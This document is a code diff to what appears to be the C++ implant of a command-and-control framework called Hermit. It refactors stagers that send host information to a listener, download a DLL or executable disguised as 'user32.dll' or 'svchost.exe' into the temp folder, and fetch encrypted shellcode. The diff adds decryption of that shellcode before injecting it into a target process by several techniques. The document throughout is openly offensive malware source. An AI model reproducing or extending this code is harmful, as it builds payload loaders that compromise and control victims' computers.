@@ -18,7 +18,6 @@ namespace Hermit
 
         // Get system information as json.
         std::wstring wInfoJSON = Handler::GetInitialInfoJSON();
-        std::string sInfoJSON = Utils::Convert::UTF8Encode(wInfoJSON);
 
         System::Http::WinHttpHandlers handlers = System::Http::InitRequest(
             pProcs,
@@ -33,39 +32,27 @@ namespace Hermit
         hSession = handlers.hSession;
         hConnect = handlers.hConnect;
 
-        // Download a DLL file
-        System::Http::WinHttpResponse resp = System::Http::SendRequest(
-            pProcs,
-            hConnect,
-            LISTENER_HOST_W,
-            LISTENER_PORT,
-            REQUEST_PATH_DOWNLOAD_W,
-            L"POST",
-            L"Content-Type: application/json\r\n",
-            (LPVOID)sInfoJSON.c_str(),
-            (DWORD)strlen(sInfoJSON.c_str())
-        );
-        if (!resp.bResult || resp.dwStatusCode != 200)
-        {
-            Free(hWinHTTPDLL, pProcs, hSession, hConnect, hRequest);
-            return;
-        }
-
-        hRequest = resp.hRequest;
-
         // Set the temp file path
         std::wstring dllFileName = L"user32.dll"; // Impersonate the file name.
         std::wstring dllPath = System::Env::GetStrings(L"%TEMP%") + L"\\" + dllFileName;
         size_t dwDllPathSize = (dllPath.size() + 1) * sizeof(wchar_t);
 
-        // Download a DLL file (create a file)
-        bResults = System::Http::WriteResponseData(pProcs, hRequest, dllPath);
+        // Download a DLL file
+        bResults = System::Http::DownloadFile(
+            pProcs,
+            hConnect,
+            LISTENER_HOST_W,
+            LISTENER_PORT,
+            REQUEST_PATH_DOWNLOAD_W,
+            L"Content-Type: application/json\r\n",
+            wInfoJSON,
+            dllPath
+        );
         if (!bResults)
         {
             Free(hWinHTTPDLL, pProcs, hSession, hConnect, hRequest);
             return;
         }
-        System::Http::WinHttpCloseHandles(pProcs, hSession, hConnect, hRequest);
 
         // Target PID
         DWORD dwPID;
@@ -101,7 +88,6 @@ namespace Hermit
 
         // Get system information as json.
         std::wstring wInfoJSON = Handler::GetInitialInfoJSON();
-        std::string sInfoJSON = Utils::Convert::UTF8Encode(wInfoJSON);
 
         System::Http::WinHttpHandlers handlers = System::Http::InitRequest(
             pProcs,
@@ -116,32 +102,22 @@ namespace Hermit
         hSession = handlers.hSession;
         hConnect = handlers.hConnect;
 
+        // Set the temp file path
+        std::wstring execFileName = L"svchost.exe"; // Impersonate the file name.
+        std::wstring execPath = System::Env::GetStrings(L"%TEMP%") + L"\\" + execFileName;
+
         // Download an executable
-        System::Http::WinHttpResponse resp = System::Http::SendRequest(
+        bResults = System::Http::DownloadFile(
             pProcs,
             hConnect,
             LISTENER_HOST_W,
             LISTENER_PORT,
             REQUEST_PATH_DOWNLOAD_W,
-            L"POST",
             L"Content-Type: application/json\r\n",
-            (LPVOID)sInfoJSON.c_str(),
-            (DWORD)strlen(sInfoJSON.c_str())
+            wInfoJSON,
+            execPath
         );
-        if (!resp.bResult || resp.dwStatusCode != 200)
-        {
-            Free(hWinHTTPDLL, pProcs, hSession, hConnect, hRequest);
-            return;
-        }
-
-        hRequest = resp.hRequest;
-
-        // Set the temp file path
-        std::wstring execFileName = L"svchost.exe"; // Impersonate the file name.
-        std::wstring execPath = System::Env::GetStrings(L"%TEMP%") + L"\\" + execFileName;
-        
-        // Download an executable
-        if (!System::Http::WriteResponseData(pProcs, hRequest, execPath))
+        if (!bResults)
         {
             Free(hWinHTTPDLL, pProcs, hSession, hConnect, hRequest);
             return;
@@ -208,12 +184,15 @@ namespace Hermit
 
         hRequest = resp.hRequest;
 
-        std::vector<BYTE> respBytes = System::Http::ReadResponseBytes(pProcs, hRequest);
-        if (respBytes.size() == 0)
+        std::vector<BYTE> encBytes = System::Http::ReadResponseBytes(pProcs, hRequest);
+        if (encBytes.size() == 0)
         {
             Free(hWinHTTPDLL, pProcs, hSession, hConnect, hRequest);
             return;
         }
+
+        // Decrypt the data
+        std::vector<BYTE> bytes = Crypt::DecryptData(Utils::Convert::VecByteToString(encBytes));
 
         // Target PID
         DWORD dwPID;
@@ -222,15 +201,15 @@ namespace Hermit
         if (strcmp(PAYLOAD_TECHNIQUE, "shellcode-injection") == 0)
         {
             dwPID = System::Process::GetProcessIdByName(TEXT(PAYLOAD_PROCESS_TO_INJECT));
-            Technique::Injection::ShellcodeInjection(dwPID, respBytes);
+            Technique::Injection::ShellcodeInjection(dwPID, bytes);
         }
         else if (strcmp(PAYLOAD_TECHNIQUE, "shellcode-execution-via-fibers") == 0)
         {
-            Technique::Injection::ShellcodeExecutionViaFibers(respBytes);
+            Technique::Injection::ShellcodeExecutionViaFibers(bytes);
         }
         else if (strcmp(PAYLOAD_TECHNIQUE, "shellcode-execution-via-apc-and-nttestalert") == 0)
         {
-            Technique::Injection::ShellcodeExecutionViaAPCAndNtTestAlert(respBytes);
+            Technique::Injection::ShellcodeExecutionViaAPCAndNtTestAlert(bytes);
         }
 
         Free(hWinHTTPDLL, pProcs, hSession, hConnect, hRequest);
